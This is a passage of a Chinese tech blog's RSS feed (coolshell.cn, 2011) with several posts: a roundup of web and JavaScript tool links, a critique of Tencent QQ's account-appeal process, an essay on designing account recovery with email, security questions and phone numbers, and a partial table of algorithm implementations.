<p>HTML5的一个很炫的示例：<a href="http://lights.elliegoulding.com/" target="_blank">http://lights.elliegoulding.com/</a>  你可以用鼠标巡航，点左键加速（另，那位朋友知道其背景音乐？）</p>
<p style="text-align: center;"><a href="http://lights.elliegoulding.com/"><img alt="image placeholder" ></a></p>
<p>想用HTML5做股票图吗？看看这个库：<a href="http://www.rocketcharts.com/">http://www.rocketcharts.com/</a></p>
<div>
<div><img alt="image placeholder" ></div>
</div>
<p>一个7K的js，可以让你的HTML的列表很灵活的分类，排序，搜索，过滤：<a href="http://listjs.com/">http://listjs.com/</a></p>
<p>一个OOP的PHP处理图片的类库：<a href="https://imagine.readthedocs.org/">http://imagine.readthedocs.org</a></p>
<p><img alt="image placeholder" ></p>
<p>一个Javascript实现的H.264解码器。<a href="https://github.com/mbebenita/Broadway">https://github.com/mbebenita/Broadway</a> （<a href="https://mbebenita.github.com/Broadway/broadway.html" target="_blank">演示地址</a> – 请用firefox打开，download速度可能很慢）不过，其是用Android C实现的，然后把C转成Javascript的代码。如果你想知道如何把C代码转成Javascript，你可以看看这个项目：<a href="https://github.com/kripken/emscripten">https://github.com/kripken/emscripten</a> – LLVM-to-JavaScript compiler。（变态！）</p>
<p>一个可以画流程图的Javascript lib – WireIt：<a href="https://neyric.github.com/wireit/">http://neyric.github.com/wireit/</a></p>
<p><img alt="image placeholder" ></p>
<p>这是一个网站，仅用CSS，没有JS，没有图片做的N多公司的logo。但其可以用纯CSS做个动画，你可以看看：<a href="http://www.ecsspert.com/atari.php" target="_blank">http://www.ecsspert.com/atari.php</a> 研究了一下发现其用到了  <span class="Apple-style-span" style="font-family: monospace; font-size: 12px; line-height: 18px; white-space: pre;">-webkit-animation</span>。</p>
<p>一个用bash处理JSON的脚本：<a href="https://github.com/rcrowley/json.sh" target="_blank">https://github.com/rcrowley/json.sh</a></p>
<p>微软VS中的Debug Canvas,相当的不错啊。<a href="https://msdn.microsoft.com/en-us/devlabs/debuggercanvas">http://msdn.microsoft.com/en-us/devlabs/debuggercanvas</a>，可惜只在 Visual Studio Ultimate里。</p>
<p>介绍一下很有意思的Firefox插件<a href="https://addons.mozilla.org/en-US/firefox/addon/tilt/" target="_blank"> Titl 3D</a>，其项目主页在 <a href="https://github.com/victorporof/Tilt">https://github.com/victorporof/Tilt</a>。这个插件使用WebGL可以3D地显示网页，安装好插件后，简单地按一下Ctrl+Shift+M就可以了。下面我用其显示了新浪微博和WebQQ。目前的功能不是很多，但是这个插件简直是太cool了——可以大胆的设想一下以后会不会有3D的网页。</p>
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p>最后，在网上看到一个笑话，如下：</p>
<p>这是给程序员们女朋友的建议。如果某程序员要和你分手，你可以参照这位国外程序员女友的作法——“你可以在facebook和twitter上拉黑我，也可以不回我的短信，但是，你永远不可能阻止我对你在Reddit上发的所有的贴投反对票！FUCK YOU ！”</p>
<p><img alt="image placeholder" ></p>
<p>就这些，希望对你会喜欢。</p>
 ]]></content>
<pubDate>2011-11-24T12:39:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/5537.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 腾讯帐号申诉的用户体验 ]]></title>
<link>https://coolshell.cn/articles/5966.html</link>
<content><![CDATA[ 
<p>前面写过一篇“<a href="https://coolshell.cn/articles/5901.html" rel="bookmark" target="_blank">腾讯，竞争力 和 用户体验</a>”批评了腾讯，于是在<a href="https://weibo.com/haoel" target="_blank">我的微博</a>上和<a href="https://coolshell.cn" target="_blank">博客</a>上收到了一些反对意见，基本上是说腾讯产品的用户体验做得很好，很方便，等等，还列举了N多的例子，以及说过什么用户数量为王的言论，让我感到我应该写一篇博客。当然，如果我们只看某个技术层面的东西的话，我同意，QQ的一些产品还是很易用的。但是我们还是要看得更深一些。Effective C++的作者Scott Meyers 在《More Effective C++》中说过——“美丽的是肤浅的表现”。   我借用一下这句话，认为QQ是好的产品的观点是肤浅的认识。</p>
<p>网上有大量的文章说<a href="http://handsome4215.blog.sohu.com/154141629.html" target="_blank">QQ扫描硬盘</a>啊，说<a href="https://hi.baidu.com/kernone/blog/item/db7218d9c1756f3933fa1cb5.html" target="_blank">QQ收集用户信息</a>啊，你可能忘了这些。前段时间的3Q大战的那个“艰难的决定”，你好像也忘了。还有狗日的腾讯，你也忘了。包括<a href="http://www.cnr.cn/newscenter/kjxw/201111/t20111103_508725677.shtml" target="_blank">QQ可以预防犯罪的新闻</a>，你可能也忘（这本就是一个容易忘事的民族）。你已经被QQ的用户体验迷住你的双眼，觉得QQ无敌于天下，就像<a href="https://weibo.com/1577826897/xyZ6vpv2y" target="_blank">这个微博</a> 以及微博里的回复一样在赞叹QQ注重细节一样，那些人在看到QQ的Mac版上向Steve Jobs感谢的字样激动不已。我感到你被一块红布蒙住了双眼也蒙住了天，我问你看见了什么，你说你看见了幸福 ，这个感觉真让你舒服……（对不起，一不小心我就在唱歌了，So So Sorry）</p>
<p>回到正题，你会说，我们在谈技术，不谈这些非技术的。好吧，我们来看看技术上的东西。我和大家说一下这两天我的真实经历。</p>
<p>两天前，我的QQ号被“恶意投诉”，封了号。腾讯让我走申诉流程，于是我看到了下面这些步骤：</p>
<ol>
<li>填入我的真实姓名，身份证号，地址等我的真实信息。 （盗号者也可以填）</li>
<li>填入我的手机号，并要用这个手机号向腾讯发个短信以收取验证码。（盗号者的手机）</li>
<li>填入我以前曾经使用过的QQ密码 （盗号者盗到的密码）</li>
<li>填入我是什么时候，在哪里注册的QQ （盗号者可以填忘记了）</li>
<li>填入最近3年来，我在哪里使用过QQ （盗号者也可以填忘 记了）</li>
<li>邀请QQ好友来帮助申诉，越多越好，需要填号好友的QQ号和真实姓名。 （盗号者也可以用自己的小号，这些小号可以加你为好友）</li>
</ol>
<p><strong>这已经是非同寻常的流程了…… 从这个申请过程中你看到了什么？</strong>你是否看到了这些东西：</p>
<p><span id="more-5966"></span></p>
<ul>
<li>收集你的用户信息，从姓名，地址，身份证到手机号，包括你好友的真实姓名。</li>
<li>收集并验证我过去使用过的密码，以及我在哪里使用QQ的。</li>
<li>这个过程无法确保安全性。没有一点技术含量。</li>
</ul>
<p>这些意味着什么？你会说，因为我不知道QQ盗号有多严重，所以他们才有这样的措施。那么我不禁要反问一下了——</p>
<ul>
<li><strong>这个世上还有什么产品是可以让别人通过申诉来让你的帐号失效的？</strong></li>
<li><strong>又有哪个产品是通过收集真实的用户信息和朋友的信息来找回密码的？</strong></li>
<li><strong>这个世上还有什么产品是在注册的时候不要真实信息，而在找回密码的时候要真实信息？</strong></li>
</ul>
<p>要收信就应该在注册的时候收集，你见过哪家银行在开户的时候不要你身份证，而你取钱，挂失的时候需要身份证的？只要腾讯愿意，弹个窗，于是就可以一点一点地让所有的人都走申诉流程以收集真实信息。我看这个过程并不是想看上去的那么简单啊。这就是用户体验？你可能还依然坚持你对这一做法的理解，那么，我真心希望你看看别的系统和软件是怎么做的。（老实说，一个手机号，另一个邮箱就可以搞定了）</p>
<p>我的朋友在微博上回复到——</p>
<blockquote><p>//<a href="https://weibo.com/zhendi419" target="_blank">@真谛419</a>：。。。qq是一个伟大的企业，一步步微创新走到了创新横扫CIA，FBI的浪潮之巅 //<a href="https://weibo.com/n/chengxi_">@chengxi_</a>: CIA弱到爆，QQ knows it all. 这个获取所有实名社交网络的创新不亚于 <a href="http://t.cn/h5kPIK" target="_blank">reCaptcha </a>，用QQ的和裸奔的区别在于“裸奔”是自愿的。</p></blockquote>
<p>你也许会说，这是腾讯因为不可抗力不得已这样做的，我们都应该理解腾讯。我想了一想，我觉得你说得有道理，你无非就是想让我说——腾讯不SB，SB的是用户。好吧，我承认你有一定的道理。</p>
<p>既然这样，那么我就不得不加粗朋友的这句话了——<strong>用QQ的和裸奔的区别在于“裸奔”是自愿的！！</strong> 而且，我仿佛、似乎、好像，隐约还听到有人在欢快地呻吟着：“在QQ上裸奔的用户体验太~~好~~啦~~，让我高潮不断啊~~~啊~~~啊~~~啊~~~~~~~~”。行了行了，你可以裸奔，但是没有必要那么爽吧。</p>
<p>（对不起，我本不应该骂人的，更不应该还骂的那么低俗，重要的是，这本来应该在新浪微博上骂的，因为那里的骂人用户体验最好的地方……）</p>
<p>结尾了，你会会说我是一个喷子，呵呵。我想说，<strong>腾讯是一个天使和魔鬼的混合体，东西还是要一分为二的看</strong>，用么还是可以适当用用的，但是我们的头脑还是要清楚一些明白那是怎么一回事。</p>
 ]]></content>
<pubDate>2011-11-25T08:27:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/5966.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何设计“找回用户帐号”功能 ]]></title>
<link>https://coolshell.cn/articles/5987.html</link>
<content><![CDATA[ 
<p>因为《<a title="腾讯帐号申诉的用户体验" href="https://coolshell.cn/articles/5966.html" target="_blank">腾讯帐号申诉的用户体验</a>》一文中好多人觉得腾讯申诉是世界级先进的，并让我拿出一个找回用户的帐号的功能来。本来不想写的，因为大家看看其它系统的就行的，但是，很明显有些人就是很懒，也不会思考，而且不会观察，所以，我就只好写下这篇科普性常识性的文章。</p>
<p>在行文之前，我得先感谢腾讯公司的至少30名员工在《<a title="腾讯帐号申诉的用户体验" href="https://coolshell.cn/articles/5966.html" target="_blank">腾讯帐号申诉的用户体验</a>》一文后的回帖（我STFG（Search The Fucking Google）看到了你们使用的那个固定IP在各个大学论坛上的腾讯的招聘广告），我感谢你们主要有两点：</p>
<ol>
<li>你们有半数以上的人留下的是gmail而不是QQMail/Foxmail的电子邮件，这点让我感到很欣慰。</li>
<li>你们在加班到晚上11点的时候都能在本站回复，的确如你们的Andy Pan所说，你们的核心竞争力很强，包括水军方面。</li>
</ol>
<p>好了，让我正式谈谈这个设计。找回用户帐号通常就用三个事就可以了：<strong>邮箱</strong>，<strong>安全问答</strong>，<strong>手机</strong>。</p>
<h4>
<strong>邮箱</strong>，<strong>安全问答</strong>，<strong>手机</strong>
</h4>
<p>大多数的系统都会使用邮箱和安全问答，这足够了，很多系统直接用邮箱做帐号名（Apple ID，Facebook，新浪微博 ….），这样一来，就算你的系统口令被盗，帐号的是改不掉的，于是你可以用邮箱找回（注：这些系统都会验证你的邮箱是否正确）。但是，如果用邮箱做帐号，会导致你的邮箱暴露了，这样为成为垃圾邮件的受害者，而且如果你还比较2的把邮箱的口令和帐号的口令设置成一样的，那么就相当坑爹了（你可以看看本站的这篇文章——<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html" target="_blank">如何设计你的口令</a>）。所以，但凡是用邮箱用为帐号的系统都不会让人看到你的注册邮箱，比如，大家就不知道我新浪微博帐号注册的邮箱，就算是知道也应该是受信的人知道（新浪微博帐号的邮箱地址的默认可见度是“你关注的人”）。</p>
<p><span id="more-5987"></span></p>
<p>这里要说一下，Google Mail使用的是电子邮件，安全问答 和 手机。你可以使用其中一种找回口令。gmail最漂亮的用户体验是其会提示你，你绑写的邮箱（哪家公司的邮箱和帐号名的第一个字母）和手机（3个尾号）。MSN和gmail相似，也会提示你绑定的邮箱，也可以使用手机，还可以使用你设置好的受信PC，以及通过客户支持（通过客户支持——收集你注册时用的名字，生日，国家地区，安全问题，使用过的口令，最近发送过的邮箱标题，联系人等，或是你绑定过的信用卡信息，但是不会有身份证）。</p>
<p>使用手机的一般是安全性比较高的网站，比如：淘宝、Gmail等。这样，使用手机找回口令也不错。因为你注册的安全问答你可能会忘了，你的绑定的邮箱也可能忘了口令，而很多木马可以盗取你的这些电脑上的安全问答或邮箱口令，但是这些木马程序盗不走你的手机（注：在移动互联网时代很可能会盗取你的手机上的信息，但是也盗不走你的手机号——无法像邮箱那样改个口令就盗走了）。你会说，手机还不是会丢失，但是你要明白，你丢失的手机，你是可以停机的，可以通过你的手机密码卡或是身份证恢复你的手机号的。另外，<strong>使用手机的好处还在于，我的系统不需要收信你的真实信息（如：姓名，身份证，住址等），这些真实信息的验证交给移动运营商验证就好了</strong>。<strong>在程序设计的里，我们把这种事叫“解耦”</strong>。Amazon就一种通过电子邮件，然后通过你使用过的信用卡后四位，以及帐单的邮寄的邮政编码，如果你的邮箱变了，没问题，打电话给客服吧，客服会问你的钱行卡号和帐单地址，电子商务的好处就是可以有信用卡或银行卡来恢复号。，因为这<strong>——把用户的真实信息“解耦”到了银行，并“耦合”和银行方面的安全策略</strong>。很明显，银行和移动公司的安全级别更高，而且用户也更信任他们。最好不要自己收集用户的真实信息，要是丢失了，你就麻烦了（在国外你就要被起诉了）</p>
<p>在这里，你可能会有疑问，如果我的帐号口令丢失了，那么盗取者会进入我的系统改我的邮箱，改我的手机，改我的信用卡等，那不也一样吗？我想说，对于邮箱和手机，其和密码的级别一样，你改密码的时候，你都要输入旧密码，所以，你改邮箱和手机的时候也要使用旧的邮箱和手机。关于你绑定的银行卡或信用卡号，就算是自己也看不见的（只能看见四个尾号），这就就可以防盗了。当然，盗电子商务帐号的人一般会用你一帐号买东西，但是其会遇到另一个麻烦，那就是要面对银行方面的审计工作——1）对于银行卡通过银行的网银，银行的安全系统会帮你审计。2）对于信用卡则要受到信用卡验证和签名的验证，还能让商家会帮你检查信用卡签名是否正确。</p>
<p>一些人说，QQ的帐号申诉过程的“美妙”在于其他尽可能多的收集你的信息，这样一来，反而是安全的，因为密码容易被盗，而你的那么多的信息则不容易被盗。这样认识只对了一半。<span style="color: #cc0000;"><strong>真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞</strong></span>（当然，我们都知道腾讯的DNA就是什么都要自己搞，连FBI和CIA的事也已经在搞了），什么自己都搞反而不安全了。</p>
<h4>其它讨论Q&amp;A</h4>
<p><strong>问题一：通过申诉找回帐号靠不靠谱？</strong></p>
<p>明显不靠谱，而且还很愚蠢。这反而成了恶意者的温床。他人可以通过申诉让正常人的帐号失效，这是一件多么愚蠢的事啊！（我的QQ帐号前两天不就被这样攻击了吗？）</p>
<p><strong>问题二：通过联系人恢复帐号靠不靠谱？</strong></p>
<p>不全然靠谱，因为你的QQ总是会有陌生人加你，你的邮箱联系人也会有一些你不受信的人。那些人可能就是攻击者的小号。所以，如果你要通过联系人的话，就不要像QQ或MSN那样坑爹的做法，让用户自己来选。而是要像Facebook那样的做法——系统随机挑些人来让你认。</p>
<p><strong>问题三：在注册时设置受信的联系人靠不靠谱？</strong></p>
<p>看似靠谱，但是个人觉得还是还一点问题。因为受信者通过电子信息无法分辨是本人还是盗号者，还要受信者实际联系一下对方。这就好像我们在手机号存电话号码的时候，写上了爸爸，妈妈这样的字眼，这样当恶意者拿了你的手机后，就可以向你的家人敲诈了，因为其直接就可以叫出对方那头的人和被攻击者的关系。</p>
<p><strong>问题四：恢复帐号的时候收集用户的真实信息靠不靠谱？</strong></p>
<p>这要看是什么情况了。如果用户在注册时提供了这些真实信息，就靠谱，如果没有就相当不靠谱。试想：你去银行开户存钱的时候，银行没有让你出示身份证，只让你设了个口令。然后我就可以用我的身份证去重置你的口令。你觉得这个事是不是相当的坑爹？！</p>
<p><strong>问题五：小白不懂邮件，不懂安全问题，不懂绑定手机啊？</strong></p>
<p>那就用耐心地客服教导这些小白（可参看银行等机构的做法——强制用户输入8位以上的口令，强制使用U盾才能进行大额转帐），提高他们的能力和对安全的认识，当有一天这套东西形成社会标准的时候，安全才会真的到来。安全的问题本来就是双方的事，只有大家都有安全意识，才能做得好。而不是迁就用户。还是Henry Ford的那名话——“如果我问用户要什么，用户会说他要一匹更快的马”，所以这世上也就不会有汽车了。QQ不应该为降低用户安全意识起推动性作用。</p>
<p><strong>问题六：我的经历是什么样的？</strong></p>
<p>我基本不上QQ，我上QQ都是被朋友和同学逼的。因为上周四我想写点关于腾读用户体验的东西，所以我才上QQ想看看，结果发现上不去了，说是帐号被投诉了，让我申诉，我猜想估计和我最早发布的关于腾讯的文章有关系。我1999年来注册的这个QQ号根本没有提交过什么身份证或是地址系统之类的东西，我曾经绑定过手机，大概在5年前绑定过。</p>
<p>于是在走申诉流程的过程中，腾讯说的绑定的手机没有被验证过，我还记得曾经我使用我的hotmail邮箱代替过我的QQ号，不过这些在被投诉的面前都不能用了。而我感到腾讯无法知道我提交的这些信息是否真实，又因为我以前曾经帮朋友注册过QQ号(我这些朋友就是腾讯员工说的小白用户)，所以，我就用一些看上去比较真实的但实际是假的信息，并用帮人注册的这些QQ号成功申诉回来了。</p>
<p>有的网友说我不分不清找回密码和申诉的差别，我在这里想说，你分明绑定了手机，但是当你发了短信后却被告诉你的手机没有被验证过。这个就很扯了。</p>
<p>于是，我才意识到QQ的这个申诉过程相当的不安全。关于一些细节问题，还请我们的我们腾讯的员工@larry同学给大家更多的细节。</p>
<p><strong>问题七：QQ还有什么样的坑爹的Use Case?</strong></p>
<p>有两个朋友在回复中说到了两个有意思的比较坑爹的Use Case。</p>
<p>@gqjjqg  说，他有个朋友被恶意申诉，有段时间和这个恶意申诉者来来回回地申诉这个QQ号，搞了一个多月都没有搞定。最后只得和那个恶意申诉者达成和解才解决了这个事。</p>
<p>@Jack Yang说，他有个朋友在网上买了一个QQ号，没过几天就被申诉回去了（毕竟那是别人用过的），然后人家再接着卖，怎么申诉都申诉不回来。欲哭无泪。</p>
<p>可见，在QQ的申诉流程下，什么密保，什么手机绑定，都成了浮云。</p>
<p> </p>
<p>（如果你还有什么样的问题，我可以在继续更新并回答你的问题）</p>
<p>——————————</p>
<p>希望你现在明白，关于腾讯的帐号申诉过程，看上去相那么回事，实际上漏洞百出。当然，我不能说腾讯是愚蠢的，因为人家搞得那么大的企业，我只能说人家是在下一盘很大的棋……</p>
 ]]></content>
<pubDate>2011-11-28T08:34:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/5987.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些有意思的算法代码 ]]></title>
<link>https://coolshell.cn/articles/6010.html</link>
<content><![CDATA[ 
<p>Keith Schwarz是一个斯坦福大学计算机科学系的讲师。他对编程充满了热情。他的主页上他自己正在实现各种各样的有意思的算法和数据结构，<a href="http://www.keithschwarz.com/interesting/">http://www.keithschwarz.com/interesting/</a>， 目前这个网页上有88个（见下面的列表），但这位大哥要干135个，你可以看看他的<a href="http://www.keithschwarz.com/interesting/" target="_blank">To-Do List</a>。</p>
<p>从这个列表上，我们可以看到，他从去年7月份就在自己实现这些东西了，我把他实现的这些算法转过来，</p>
<ul>
<li>一方面我们可以学习一下这些算法和代码，因为很多东西对我来说都比较新，我以前<a href="https://coolshell.cn/articles/2583.html" target="_blank">列举过一些经典的算法</a>，<a title="链接：算法和数据结构词典" href="https://coolshell.cn/articles/1499.html" rel="bookmark">算法和数据结构词典</a>，还有<a title="链接：可视化的数据结构和算法" href="https://coolshell.cn/articles/4671.html" rel="bookmark">可视化的数据结构和算法</a>， 不过感觉都没有这个全。</li>
</ul>
<ul>
<li>另一方面我希望这个事可以影响到一些正在学习编程的人。看看别人是怎么学习编程的，希望对你有借鉴作用。</li>
</ul>
<table width="100%" border="0" cellspacing="0" cellpadding="6">
<thead>
<tr>
<th>Name</th>
<th>Link</th>
<th>Date Added</th>
<th>Language</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Binomial Heap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=binomial-heap">(link)</a></td>
<td>7‑24‑2010</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Binomial_heap">binomial heap</a> data structure for use as a priority queue.</td>
</tr>
<tr>
<td>Bounded Priority Queue</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=bounded-pqueue">(link)</a></td>
<td>7‑24‑2010</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Priority_queue">priority queue</a> with a fixed upper limit to its size..</td>
</tr>
<tr>
<td>Matrix</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=matrix">(link)</a></td>
<td>7‑24‑2010</td>
<td>C++</td>
<td>A collection of classes for manipulating <a href="https://en.wikipedia.org/wiki/Matrix_%28mathematics%29">matrices</a>.</td>
</tr>
<tr>
<td>VList</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=vlist">(link)</a></td>
<td>8‑16‑2010</td>
<td>Java</td>
<td>An implementation of the <tt>List</tt> abstraction backed by a <a href="https://en.wikipedia.org/wiki/VList">VList</a>.</td>
</tr>
<tr>
<td>Function Wrapper</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=function">(link)</a></td>
<td>8‑16‑2010</td>
<td>C++</td>
<td>A C++ wrapper class around unary functions.</td>
</tr>
<tr>
<td>String</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=string">(link)</a></td>
<td>8‑17‑2010</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/String_(computer_science)">string</a> abstraction that uses the small string optimization.</td>
</tr>
</tbody>
</table>
<p><span id="more-6010"></span></p>
<table>
<tbody>
<tr>
<td>nstream</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=nstream">(link)</a></td>
<td>8‑31‑2010</td>
<td>C++</td>
<td>An stream class that sends and receives data over a network.</td>
</tr>
<tr>
<td>Snake</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=snake">(link)</a></td>
<td>8‑31‑2010</td>
<td>C++</td>
<td>An implementation of the game <a href="https://en.wikipedia.org/wiki/Snake_(video_game)"><em>Snake</em></a> with a rudimentary AI.</td>
</tr>
<tr>
<td>Mergesort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=mergesort">(link)</a></td>
<td>9‑14‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Mergesort">mergesort</a> algorithm.</td>
</tr>
<tr>
<td>Next Permutation</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=next-permutation">(link)</a></td>
<td>10‑6‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="http://www.cplusplus.com/reference/algorithm/next_permutation/"><tt>next_permutation</tt></a> STL algorithm.</td>
</tr>
<tr>
<td>Interval Heap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=interval-heap">(link)</a></td>
<td>10‑17‑2010</td>
<td>Java</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Double-ended_priority_queue">double-ended priority queue</a> using an <a href="http://www.mhhe.com/engcs/compsci/sahni/enrich/c9/interval.pdf">interval heap</a>.</td>
</tr>
<tr>
<td>Linear-Time Selection</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=median-of-medians">(link)</a></td>
<td>10‑18‑2010</td>
<td>C++</td>
<td>A deterministic, linear-time <a href="https://en.wikipedia.org/wiki/Selection_algorithm">selection algorithm</a> using the <a href="https://en.wikipedia.org/wiki/Selection_algorithm#Linear_general_selection_algorithm_-_Median_of_Medians_algorithm">median-of-medians</a> algorithm.</td>
</tr>
<tr>
<td>Heapsort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=heapsort">(link)</a></td>
<td>10‑18‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Heapsort">heapsort</a> algorithm.</td>
</tr>
<tr>
<td>Union-Find</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=union-find">(link)</a></td>
<td>10‑19‑2010</td>
<td>Java</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Disjoint-set_data_structure">disjoint-set data structure</a> using a disjoint set forest.</td>
</tr>
<tr>
<td>Radix Sort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=radix-sort">(link)</a></td>
<td>10‑19‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Radix_sort">radix sort</a> algorithm.</td>
</tr>
<tr>
<td>Rational</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=rational">(link)</a></td>
<td>10‑23‑2010</td>
<td>C++</td>
<td>A data structure representing a <a href="https://en.wikipedia.org/wiki/Rational_number">rational number</a>.</td>
</tr>
<tr>
<td>DPLL</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=dpll">(link)</a></td>
<td>10‑23‑2010</td>
<td>Haskell</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/DPLL_algorithm">DPLL algorithm</a> for solving <a href="https://en.wikipedia.org/wiki/Boolean_satisfiability_problem">CNF-SAT</a>.</td>
</tr>
<tr>
<td>Smoothsort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=smoothsort">(link)</a></td>
<td>10‑27‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="http://www.keithschwarz.com/smoothsort/">smoothsort algorithm</a>, an adaptive heapsort variant.</td>
</tr>
<tr>
<td>Extendible Array</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=extendible-array">(link)</a></td>
<td>10‑28‑2010</td>
<td>Java</td>
<td>A <a href="https://en.wikipedia.org/wiki/Dynamic_array">dynamic array</a> class with O(1) worst-case runtime lookup and append.</td>
</tr>
<tr>
<td>In-Place Merge</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=inplace-merge">(link)</a></td>
<td>10‑29‑2010</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Merge_algorithm">merge algorithm</a> that runs <a href="https://en.wikipedia.org/wiki/In-place_algorithm">in-place</a>.</td>
</tr>
<tr>
<td>Random Shuffle</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=random-shuffle">(link)</a></td>
<td>10‑29‑2010</td>
<td>C++</td>
<td>An algorithm for generating a <a href="https://en.wikipedia.org/wiki/Random_permutation">random permutation</a> of a set of elements.</td>
</tr>
<tr>
<td>Random Sample</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=random-sample">(link)</a></td>
<td>10‑29‑2010</td>
<td>C++</td>
<td>An O(n) time, O(1) space algorithm for randomly choosing k elements out of a stream with uniform probability.</td>
</tr>
<tr>
<td>Natural Mergesort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=natural-mergesort">(link)</a></td>
<td>10‑30‑2010</td>
<td>C++</td>
<td>An implementation of <a href="http://www.algorithmist.com/index.php/Merge_sort#Natural_mergesort">natural mergesort</a>, an <a href="https://en.wikipedia.org/wiki/Adaptive_sort">adaptive</a> variant of <a href="https://en.wikipedia.org/wiki/Merge_sort">mergesort</a>.</td>
</tr>
<tr>
<td>Interpolation Search</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=interpolation-search">(link)</a></td>
<td>10‑31‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Interpolation_search">interpolation search</a> algorithm.</td>
</tr>
<tr>
<td>Introsort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=introsort">(link)</a></td>
<td>10‑31‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Introsort">introsort</a> algorithm, a fast hybrid of <a href="https://en.wikipedia.org/wiki/Quicksort">quicksort</a>, <a href="https://en.wikipedia.org/wiki/Heapsort">heapsort</a>, and<a href="https://en.wikipedia.org/wiki/Insertion_sort">insertion sort</a>.</td>
</tr>
<tr>
<td>Hashed Array Tree</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=hashed-array-tree">(link)</a></td>
<td>11‑3‑2010</td>
<td>Java</td>
<td>An implementation of a dynamic array backed by a <a href="https://en.wikipedia.org/wiki/Hashed_array_tree">hashed array tree</a>.</td>
</tr>
<tr>
<td>Recurrence Solver</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=recurrence">(link)</a></td>
<td>11‑13‑2010</td>
<td>C++</td>
<td>A fast algorithm for generating terms of a sequence defined by a <a href="https://en.wikipedia.org/wiki/Recurrence_relation#Linear_homogeneous_recurrence_relations_with_constant_coefficients">linear recurrence relation</a>.</td>
</tr>
<tr>
<td>Fibonacci Heap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=fibonacci-heap">(link)</a></td>
<td>11‑15‑2010</td>
<td>Java</td>
<td>An implementation of a priority queue backed by a <a href="https://en.wikipedia.org/wiki/Fibonacci_heap">Fibonacci heap</a>.</td>
</tr>
<tr>
<td>Dijkstra’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=dijkstra">(link)</a></td>
<td>11‑16‑2010</td>
<td>Java</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Dijkstra's_algorithm">Dijkstra’s algorithm</a> for single-source shortest paths.</td>
</tr>
<tr>
<td>Prim’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=prim">(link)</a></td>
<td>11‑17‑2010</td>
<td>Java</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Prim's_algorithm">Prim’s algorithm</a> for computing <a href="https://en.wikipedia.org/wiki/Minimum_spanning_tree">minimum spanning trees</a>.</td>
</tr>
<tr>
<td>Kruskal’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=kruskal">(link)</a></td>
<td>11‑17‑2010</td>
<td>Java</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Kruskal's_algorithm">Kruskal’s algorithm</a> for computing <a href="https://en.wikipedia.org/wiki/Minimum_spanning_tree">minimum spanning trees</a>.</td>
</tr>
<tr>
<td>Majority Element</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=majority-element">(link)</a></td>
<td>11‑17‑2010</td>
<td>C++</td>
<td>A fast, linear-time algorithm for finding the <a href="https://www.cs.utexas.edu/~moore/best-ideas/mjrty/">majority element</a> of a data set.</td>
</tr>
<tr>
<td>Haar Transform</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=haar">(link)</a></td>
